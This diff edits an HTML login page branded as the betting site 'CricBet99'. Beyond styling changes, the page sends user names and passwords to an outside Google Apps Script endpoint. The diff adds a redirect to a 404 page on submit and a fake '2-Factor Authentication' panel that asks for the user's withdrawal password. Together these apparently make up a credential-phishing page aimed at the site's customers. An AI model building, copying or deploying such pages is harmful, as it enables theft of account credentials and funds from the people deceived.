@@ -7,7 +7,8 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(5deg, rgba(69, 100, 51, 0.959),#355539,#2e4731,#864f04);
+            background: linear-gradient(180deg, #8a4e00, #116257);
+
             margin: 0;
             padding: 0;
             display: flex;
@@ -21,11 +22,11 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 330px;
-            height: 300px;
+            width: 280px;
+            height: 330px; /* Adjusted height */
             text-align: center;
             position: relative;
-            top: -150px;
+            top: -120px; /* Adjusted top position */
         }
 
         .login-container img {
@@ -41,12 +42,12 @@
             margin-top: 40px;
         }
 
-        .login-heading {
+        /* Change the color of Login heading to brown */
+        h2 {
+            color: #8B4513; /* Brown color */
             font-size: 24px;
             font-weight: bold;
-            margin-bottom: 10px;
-            color: #8B4513;
-            margin-top: -30px;
+            margin-bottom: 20px;
         }
 
         .form-group {
@@ -84,7 +85,7 @@
         }
 
         .login-demo-btn {
-            margin-top: 15px;
+            margin-top: 10px; /* Reduced margin-top to move the button up */
             background-color: #8B4513;
         }
 
@@ -129,15 +130,70 @@
         .recaptcha-text a:hover {
             text-decoration: underline;
         }
+
+        /* Adjusting the demo-page container's margin to move it upwards */
+        .demo-page {
+    display: none;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    width: 280px;
+    text-align: center;
+    position: relative; /* Or use position: absolute; */
+    top: -190px; /* Adjust this to move it higher */
+    margin-top: 0; /* Set to 0 for cleaner positioning */
+}
+/* Demo container logo styling */
+.demo-page img.demo-logo {
+    width: 350px; /* Same width as the login container logo */
+    height: auto;
+    position: absolute;
+    top: -90px; /* Same position as the login container logo */
+    left: 50%;
+    transform: translateX(-50%);
+}
+
+        .demo-page input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-top: 15px;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+        }
+
+        /* New styles for auth-text */
+        .auth-text {
+            text-align: center;
+            margin-top: 10px;
+            padding: 0;
+        }
+
+        .line {
+            font-size: 16px;
+            font-weight: bold;
+            color: black;
+            margin: 0; /* Remove extra margin */
+            padding: 0; /* Remove any padding */
+        }
+
+        .password-prompt {
+            font-size: 16px;
+            font-weight: bold;
+            color: black;
+            margin: 0; /* Remove extra margin */
+            padding: 0; /* Remove any padding */
+        }
     </style>
 </head>
 <body>
+
+    <!-- Login Form -->
     <div class="login-container">
         <img src="logo.png" alt="CricBet99 Logo">
         <div class="form-container">
-            <div class="login-heading">LOGIN</div>
-            <!-- Form connected to Google Apps Script Web App -->
-            <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST">
+            <h2>Login</h2> <!-- Brown colored Login heading -->
+            <form onsubmit="redirectTo404()" action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST">
                 <div class="form-group">
                     <label for="UserName"></label>
                     <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
@@ -148,7 +204,9 @@
                 </div>
                 <button type="submit" class="btn">Login</button>
             </form>
-            <button class="btn login-demo-btn">Login with Demo ID</button>
+            
+            <button class="btn login-demo-btn" onclick="showDemoPage()">Login with Demo ID</button>
+            
             <div class="signup-link"></div>
             <div class="recaptcha-text">
                 <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
@@ -157,5 +215,48 @@
             </div>
         </div>
     </div>
+
+  <!-- Demo Login Form -->
+<div class="demo-page" id="demoPage">
+    <!-- Add a logo for the demo container -->
+    <img src="logo.png" alt="CricBet99 Logo" class="demo-logo">
+    
+    <h2>Login</h2>
+    <div class="auth-text">
+        <p class="line">2-Factor Authentication Enabled.</p>
+        <p class="password-prompt">Enter Your Withdrawal Password</p>
+    </div>
+
+    <form id="demoForm">
+        <div class="form-group">
+            <input type="text" id="demoUser" name="demoUser" placeholder="Withdrawal Code" required>
+        </div>
+        <button type="submit" class="btn">Submit</button>
+    </form>
+    <div class="recaptcha-text">
+        <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
+        <a href="#">Privacy Policy</a> and 
+        <a href="#">Terms of Service</a> apply.
+    </div>
+</div>
+
+
+    <script>
+        // Show demo login form when "Login with Demo ID" button is clicked
+        function showDemoPage() {
+            // Hide the main login container
+            document.querySelector('.login-container').style.display = 'none';
+            // Show the demo login form
+            document.getElementById('demoPage').style.display = 'block';
+        }
+
+        // Handle the demo form submission
+        document.getElementById('demoForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            alert('Demo Login Submitted!');
+            // You can perform additional actions here, like form validation
+        });
+    </script>
+
 </body>
 </html>
